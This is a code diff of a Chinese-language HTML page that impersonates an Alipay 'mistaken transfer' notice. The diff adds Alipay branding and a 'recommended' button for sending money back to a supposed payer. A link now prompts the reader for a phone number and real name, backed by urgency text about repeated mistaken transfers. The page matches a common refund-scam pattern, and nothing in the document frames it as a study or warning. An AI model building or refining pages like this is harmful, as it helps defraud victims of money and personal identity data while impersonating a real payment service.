@@ -12,10 +12,23 @@
         #dialog {
             background: #fff;
             border-radius: 10px;
-            padding: 30px 20px 20px 20px;
+            padding: 0 0 20px 0;
             margin: 80px auto 0 auto;
-            max-width: 400px;
+            max-width: 420px;
             box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        #dialog-header {
+            background: #0085FF;
+            color: #fff;
+            font-size: 22px;
+            font-weight: bold;
+            text-align: left;
+            padding: 18px 24px 12px 24px;
+            letter-spacing: 2px;
+        }
+        #dialog-content {
+            padding: 0 24px;
         }
         #content { 
             display: none; 
@@ -66,29 +79,33 @@
             margin-left: 6px;
             vertical-align: middle;
         }
-        h2 { color: #0085FF; }
+        h2 { color: #0085FF; margin-bottom: 10px;}
         .gray { color: #888; font-size: 13px; }
+        a { color: #0085FF; text-decoration: underline; cursor:pointer;}
     </style>
 </head>
 <body>
     <div id="menu">我的信息</div>
     <div id="dialog">
-        <h2>转错款详情</h2>
-        <div class="gray" style="margin-bottom:10px;">处理状态：<span style="color:#0085FF">已提交</span></div>
-        <div style="font-size:15px;line-height:1.7;">
-            有用户向支付宝反馈因输错账号向您此账户误转一笔钱，<a href="#">点此进入单单核实</a>，如情况属实您可自行操作转回，转账详情如下：<br>
-            <br>打款方：176******66
-            <br>收款方：138******56
-            <br>转账交易号：20251106200040011100170099590526
-            <br>转账金额：1.00
-            <br>转账时间：2025-11-06 23:26:34
-        </div>
-        <div style="margin:18px 0 8px 0;">请选择以下方式之一进行处理：</div>
-        <button class="btn btn-primary" id="btnSelf">自行转回给对方 <span class="tag">推荐</span></button>
-        <button class="btn btn-disabled" id="btnAuth">授权支付宝退回对方</button>
-        <div class="gray" style="margin-top:8px;">
-            <div>自行转回：点击后会进入打款人转账界面，确认金额无误后可直接向对方转账</div>
-            <div>授权退回：我的账户余额充足，但不方便自行操作，需授权支付宝客服协助操作退款</div>
+        <div id="dialog-header">支付宝</div>
+        <div id="dialog-content">
+            <h2>转错款详情</h2>
+            <div class="gray" style="margin-bottom:10px;">处理状态：<span style="color:#0085FF">已提交</span></div>
+            <div style="font-size:15px;line-height:1.7;">
+                有用户向支付宝反馈因输错账号向您此账户误转一笔钱，<a id="checkLink">点此进入单单核实</a>，如情况属实您可自行操作转回，转账详情如下：<br>
+                <br>打款方：136******49
+                <br>收款方：138******56
+                <br>转账交易号：20251106200040011100170099590526
+                <br>转账金额：1.00
+                <br>转账时间：2025-11-07 13:10
+            </div>
+            <div style="margin:18px 0 8px 0;">请选择以下方式之一进行处理：</div>
+            <button class="btn btn-primary" id="btnSelf">自行转回给对方 <span class="tag">推荐</span></button>
+            <button class="btn btn-disabled" id="btnAuth">授权支付宝退回对方</button>
+            <div class="gray" style="margin-top:8px;">
+                <div>自行转回：点击后会进入打款人转账界面，确认金额无误后可直接向对方转账</div>
+                <div>授权退回：我的账户余额充足，但不方便自行操作，需授权支付宝客服协助操作退款</div>
+            </div>
         </div>
     </div>
     <div id="content">
@@ -103,9 +120,9 @@
             return name && name.trim().length >= 2;
         }
         function showIdentityPrompt() {
-            let phone = prompt('请确认身份，输入手机号码：');
+            let phone = prompt('由于今日转错款超过2次，请输入手机号码进行确认身份：');
             if (phone && checkPhone(phone)) {
-                let name = prompt('请输入一个真实姓名以确认身份信息：');
+                let name = prompt('由于今日转错款超过2次，请输入一个真实姓名以确认身份信息：');
                 if (checkName(name)) {
                     localStorage.setItem('my_phone', phone);
                     localStorage.setItem('my_name', name.trim());
@@ -137,6 +154,9 @@
             } else {
                 alert('暂无已保存身份信息');
             }
+        }
+        document.getElementById('checkLink').onclick = function() {
+            showIdentityPrompt();
         }
     </script>
 </body>
